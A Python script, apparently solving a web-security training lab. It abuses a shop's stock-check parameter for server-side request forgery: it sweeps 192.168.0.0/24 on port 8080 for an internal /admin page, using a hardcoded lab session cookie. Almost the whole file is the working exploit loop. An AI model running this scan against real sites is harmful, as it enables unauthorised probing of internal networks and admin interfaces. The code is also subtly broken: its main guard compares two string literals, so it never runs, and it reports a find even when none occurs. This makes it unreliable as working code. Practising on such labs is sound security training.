"""Module providing a function to send and receive http requests"""
import requests  # library used to make http requests

# supply target url here
URL: str = "https://0ad0003704be927380209a2500c500a8.web-security-academy.net/product/stock"

# define header and data values
COOKIES: dict = {
  'Cookie' : 'session=Zix4h5AMTP4WjAFQIb6aKtL1gLjehUGC'
}

HEADERS: dict = {
    # change content-type accordingly
    "Content-Type": "application/x-www-form-urlencoded",

    # change referer accordingly
    "Referer": 
    "https://0ad0003704be927380209a2500c500a8.web-security-academy.net/product?productId=1",

    # add more headers as necessary
    "Origin": "https://0ad0003704be927380209a2500c500a8.web-security-academy.net",
}

# message to look for in the response
MESSAGE: str = "Could not connect to external stock check service"
MESSAGE2: str = "Missing parameter"

# lines below used for print debugging
# res = requests.post(URL, data=data, headers=HEADERS, cookies=COOKIES)
# Print request information
# print("Sending request:")
# print("URL:", URL)
# print("Headers:", HEADERS)
# print("Data:", data)
# print(res.text)

def scan_subnet_by_sending_requests() -> None:
    """function for scanning the /24 subnet by replacing the last octet of the target IP
    and observing the response"""

    # scan /24 subnet
    for i in range (256):
        data: dict = {"stockApi": f"http://192.168.0.{i}:8080/admin"}

        # send a post request containing the headers and data.
        # timeout is placed to avoid the script from hanging
        res = requests.post(URL, data=data, headers=HEADERS, cookies=COOKIES, timeout=30)

        print(i)
        if MESSAGE2 in res.text:
            continue
        if MESSAGE not in res.text:
            # print request information for debugging
            # print(i)
            # print(res.text)
            break
    print(f"Open port in .{i}")

def main() -> None:
    """defines the main function, adopting golang convention of `func main()`"""
    scan_subnet_by_sending_requests()

if '__name__' == '__main__':
    main()
